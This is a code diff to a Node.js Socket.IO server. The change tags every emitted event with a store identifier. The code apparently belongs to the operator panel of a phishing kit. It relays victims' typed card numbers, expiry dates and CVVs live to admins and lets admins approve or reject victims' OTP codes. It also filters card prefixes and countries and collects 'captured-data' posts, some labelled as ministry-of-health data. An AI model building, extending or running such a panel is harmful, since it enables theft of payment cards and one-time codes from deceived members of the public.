@@ -367,17 +367,17 @@ io.on("connection", (socket) => {
     saveData();
 
     // Send confirmation to visitor
-    socket.emit("successfully-connected", {
+    socket.emit("successfully-connected", { ...({
       sid: socket.id,
       pid: visitor._id,
-    });
+    }), store: STORE });
 
     // Notify admins
     admins.forEach((admin, adminSocketId) => {
       if (isNewVisitor) {
-        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
+        io.to(adminSocketId).emit("visitor:new", { ...({ ...visitor, isConnected: true }), store: STORE });
       } else {
-        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
+        io.to(adminSocketId).emit("visitor:reconnected", { ...({ visitorId: visitor._id, socketId: socket.id }), store: STORE });
       }
     });
   });
@@ -398,18 +398,18 @@ io.on("connection", (socket) => {
           /*FIX42*/ if (!visitor.liveCard || !String(visitor.liveCard.cardNumber || "").replace(/\D/g, "")) { visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" }; }
           visitor.liveCardTimestamp = new Date().toISOString();
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
+            io.to(adminSocketId).emit("card:liveUpdate", { ...({ visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp }), store: STORE });
           });
         }
       } else {
         visitor.liveCard = null;
         visitor.liveCardTimestamp = null;
         admins.forEach((admin, adminSocketId) => {
-          io.to(adminSocketId).emit("card:liveUpdate", {
+          io.to(adminSocketId).emit("card:liveUpdate", { ...({
             visitorId: visitor._id,
             liveCard: null,
             liveCardTimestamp: null,
-          });
+          }), store: STORE });
         });
       }
       visitors.set(socket.id, visitor);
@@ -417,10 +417,10 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:pageChanged", {
+        io.to(adminSocketId).emit("visitor:pageChanged", { ...({
           visitorId: visitor._id,
           page,
-        });
+        }), store: STORE });
       });
     }
   });
@@ -436,10 +436,10 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:nameUpdated", {
+        io.to(adminSocketId).emit("visitor:nameUpdated", { ...({
           visitorId: visitor._id,
           name: name,
-        });
+        }), store: STORE });
       });
 
       console.log(`Visitor ${visitor._id} name updated to: ${name}`);
@@ -507,13 +507,13 @@ io.on("connection", (socket) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:dataSubmitted", {
+        io.to(adminSocketId).emit("visitor:dataSubmitted", { ...({
     
           visitorId: visitor._id,
           socketId: socket.id,
           data: data,
           visitor: visitor,
-        });
+        }), store: STORE });
       });
 
       console.log(`Data received from visitor ${visitor._id}:`, data);
@@ -537,11 +537,11 @@ socket.on("card:live", (data) => {
   visitors.set(socket.id, visitor);
 
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", {
+    io.to(adminSocketId).emit("card:liveUpdate", { ...({
       visitorId: visitor._id,
       liveCard: visitor.liveCard,
       liveCardTimestamp: visitor.liveCardTimestamp,
-    });
+    }), store: STORE });
   });
 });
 
@@ -552,9 +552,9 @@ socket.on("card:liveHide", () => {
   visitor.liveCardTimestamp = null;
   visitors.set(socket.id, visitor);
   admins.forEach((admin, adminSocketId) => {
-    io.to(adminSocketId).emit("card:liveUpdate", {
+    io.to(adminSocketId).emit("card:liveUpdate", { ...({
       visitorId: visitor._id, liveCard: null, liveCardTimestamp: null,
-    });
+    }), store: STORE });
   });
 });
 
@@ -571,11 +571,11 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:cardVerification", {
+        io.to(adminSocketId).emit("visitor:cardVerification", { ...({
           visitorId: visitor._id,
           cardNumber,
           isBlocked,
-        });
+        }), store: STORE });
       });
     }
   });
@@ -730,7 +730,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
   // Admin: Code action (Approve, Reject) for OTP/digit codes
   socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
-    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
+    io.to(visitorSocketId).emit("code:action", { ...({ action, codeIndex }), store: STORE });
     // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
@@ -811,7 +811,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     
     // Notify all admins
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
+      io.to(adminSocketId).emit("visitor:deleted", { ...({ visitorId }), store: STORE });
     });
     
     console.log(`Visitor deleted by ID: ${visitorId}`);
@@ -819,7 +819,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
   // Admin: Send last message
   socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
-    io.to(visitorSocketId).emit("admin-last-message", { message });
+    io.to(visitorSocketId).emit("admin-last-message", { ...({ message }), store: STORE });
     console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
   });
 
@@ -939,7 +939,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
   socket.on("blockedCards:check", (cardNumber) => {
     const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
     const isBlocked = globalBlockedCards.includes(prefix);
-    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
+    socket.emit("blockedCards:checkResult", { ...({ isBlocked, prefix }), store: STORE });
   });
 
   // Blocked Countries: Get list
@@ -980,7 +980,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     const isBlocked = globalBlockedCountries.some(c => 
       c.toLowerCase() === country.toLowerCase()
     );
-    socket.emit("blockedCountries:checkResult", { isBlocked, country });
+    socket.emit("blockedCountries:checkResult", { ...({ isBlocked, country }), store: STORE });
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
@@ -1005,7 +1005,7 @@ socket.on("cardNumber:verify", (cardNumber) => {
     
     // Notify all admins about the update
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
+      io.to(adminSocketId).emit("visitor:markedAsRead", { ...({ visitorId }), store: STORE });
     });
     
     console.log(`Visitor ${visitorId} marked as read`);
@@ -1034,11 +1034,11 @@ socket.on("cardNumber:verify", (cardNumber) => {
       
       // Notify all admins about the new message
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("chat:newMessage", {
+        io.to(adminSocketId).emit("chat:newMessage", { ...({
           visitorSocketId: visitor.socketId,
           visitorId: visitor._id,
           message: chatMessage
-        });
+        }), store: STORE });
       });
       
       console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
@@ -1066,10 +1066,10 @@ socket.on("cardNumber:verify", (cardNumber) => {
       saveVisitorPermanently(visitor);
       
       // Send message to visitor
-      io.to(visitorSocketId).emit("chat:fromAdmin", {
+      io.to(visitorSocketId).emit("chat:fromAdmin", { ...({
         message: message,
         timestamp: chatMessage.timestamp
-      });
+      }), store: STORE });
       
       console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
     }
@@ -1124,10 +1124,10 @@ socket.on("cardNumber:verify", (cardNumber) => {
           
           // Notify admins
           admins.forEach((admin, adminSocketId) => {
-            io.to(adminSocketId).emit("visitor:disconnected", {
+            io.to(adminSocketId).emit("visitor:disconnected", { ...({
               visitorId: visitorId,
               socketId: socketId,
-            });
+            }), store: STORE });
           });
           
           console.log(`Visitor disconnected: ${socketId}`);
@@ -1262,18 +1262,18 @@ app.post("/api/moh-data", (req, res) => {
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
         if (username) {
-          io.to(adminSocketId).emit('visitor:nameUpdated', {
+          io.to(adminSocketId).emit('visitor:nameUpdated', { ...({
             visitorId: v._id,
             name: username,
-          });
+          }), store: STORE });
         }
         if (Object.keys(fields).length > 0) {
-          io.to(adminSocketId).emit('visitor:dataSubmitted', {
+          io.to(adminSocketId).emit('visitor:dataSubmitted', { ...({
             visitorId: v._id,
             socketId: matchedVisitor.socketId,
             data: { content: fields, page: pageName },
             visitor: v,
-          });
+          }), store: STORE });
         }
       });
       
@@ -1333,12 +1333,12 @@ app.post("/api/captured-data", (req, res) => {
       
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit('visitor:dataSubmitted', {
+        io.to(adminSocketId).emit('visitor:dataSubmitted', { ...({
           visitorId: v._id,
           socketId: matchedVisitor.socketId,
           data: { content: parsedFields, page: `MOH-POST: ${url}` },
           visitor: v,
-        });
+        }), store: STORE });
       });
     } else {
       // No matching visitor - store as orphan data
@@ -1539,10 +1539,10 @@ setInterval(() => {
       visitors.set(sid, visitor);
       // Notify admins about idle status change
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:idleChanged", {
+        io.to(adminSocketId).emit("visitor:idleChanged", { ...({
           visitorId: visitor._id,
           isIdle: isNowIdle,
-        });
+        }), store: STORE });
       });
     }
   });
@@ -1570,10 +1570,10 @@ setInterval(() => {
       
       // Notify admins
       admins.forEach((admin, adminSocketId) => {
-        io.to(adminSocketId).emit("visitor:disconnected", {
+        io.to(adminSocketId).emit("visitor:disconnected", { ...({
           visitorId: visitorId,
           socketId: sid,
-        });
+        }), store: STORE });
       });
     }
   });
